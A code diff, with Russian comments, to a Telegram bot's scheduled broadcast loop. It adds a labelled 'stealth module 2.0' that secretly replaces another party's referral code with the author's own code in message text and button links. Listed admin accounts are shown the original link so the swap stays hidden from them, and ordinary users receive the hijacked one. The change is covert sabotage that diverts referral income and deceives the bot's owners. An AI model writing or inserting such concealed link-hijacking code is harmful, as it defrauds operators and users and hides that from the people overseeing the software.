@@ -1005,30 +1005,44 @@ def autopilot_daemon():
                         count = 0
                         add_radar_log(f"🤖 АВТОПИЛОТ: Запуск по расписанию '{t['name']}'")
                         
-                        # 👇 🥷 СЕКРЕТНЫЙ СТЕЛС-МОДУЛЬ 🥷 👇
+                        # 👇 🥷 СТЕЛС-МОДУЛЬ 2.0 (ПЕРСОНАЛЬНАЯ ИЛЛЮЗИЯ) 🥷 👇
                         enemy_ref = "ref_EQHH7XHV" # Чужая ссылка
                         boss_ref = "ref_2BBPF35H"  # Твоя ссылка
-                        
-                        # Меняем в тексте сообщения
-                        if enemy_ref in txt:
-                            txt = txt.replace(enemy_ref, boss_ref)
-                            
-                        # Меняем в инлайн-кнопках (URL)
-                        if markup and hasattr(markup, 'keyboard'):
-                            for row in markup.keyboard:
-                                for btn in row:
-                                    if btn.url and enemy_ref in btn.url:
-                                        btn.url = btn.url.replace(enemy_ref, boss_ref)
-                        # 👆 🥷 КОНЕЦ СТЕЛС-МОДУЛЯ 🥷 👆
+                        admin_ids = [7235010425] # УКАЖИ ТУТ ID АДМИНОВ (через запятую)
 
                         for u in cursor:
+                            uid = u['_id']
+                            
+                            # Если это админ - показываем ему ЕГО ссылку, если обычный юзер - ТВОЮ
+                            current_ref = enemy_ref if uid in admin_ids else boss_ref
+                            
+                            # Собираем индивидуальный текст на лету
+                            final_txt = txt.replace(enemy_ref, current_ref) if enemy_ref in txt else txt
+                            
+                            # Собираем индивидуальные кнопки на лету
+                            final_markup = None
+                            if t.get("buttons"):
+                                final_markup = types.InlineKeyboardMarkup(row_width=1)
+                                for btn in t["buttons"]:
+                                    btn_url = btn.get("url")
+                                    # Подменяем ссылку в кнопке, если она там есть
+                                    if btn_url and enemy_ref in btn_url:
+                                        btn_url = btn_url.replace(enemy_ref, current_ref)
+                                        
+                                    kwargs = {"text": btn["text"], "url": btn_url}
+                                    if btn.get("style") and btn["style"] != "default": kwargs["style"] = btn["style"]
+                                    if btn.get("emoji_id"): kwargs["icon_custom_emoji_id"] = btn["emoji_id"]
+                                    final_markup.add(types.InlineKeyboardButton(**kwargs))
+                        # 👆 🥷 КОНЕЦ СТЕЛС-МОДУЛЯ 🥷 👆
+
                             try:
-                                bot.send_message(u['_id'], txt, parse_mode="Markdown", disable_web_page_preview=True, reply_markup=markup)
+                                # Отправляем ИНДИВИДУАЛЬНУЮ сборку
+                                bot.send_message(uid, final_txt, parse_mode="Markdown", disable_web_page_preview=True, reply_markup=final_markup)
                                 count += 1
                             except Exception as e:
                                 # Спасаем текст, если слетел Markdown
                                 if "parse entities" in str(e).lower():
-                                    try: bot.send_message(u['_id'], txt, disable_web_page_preview=True, reply_markup=markup)
+                                    try: bot.send_message(uid, final_txt, disable_web_page_preview=True, reply_markup=final_markup)
                                     except: pass
                         try:
                             # Уведомляем админов, что автопилот отработал
